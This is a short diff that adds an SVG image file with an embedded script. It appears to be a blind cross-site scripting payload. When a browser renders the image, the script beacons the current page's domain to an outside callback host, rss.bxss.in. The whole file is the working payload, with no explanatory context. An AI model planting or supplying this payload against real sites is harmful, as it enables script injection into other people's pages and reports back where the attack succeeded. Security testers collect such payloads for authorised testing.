@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>
+    // Inline JS version (e.g. for local execution)
+    new Image().src = "https://rss.bxss.in?hit=" + document.domain;
+  </script>
+</svg>
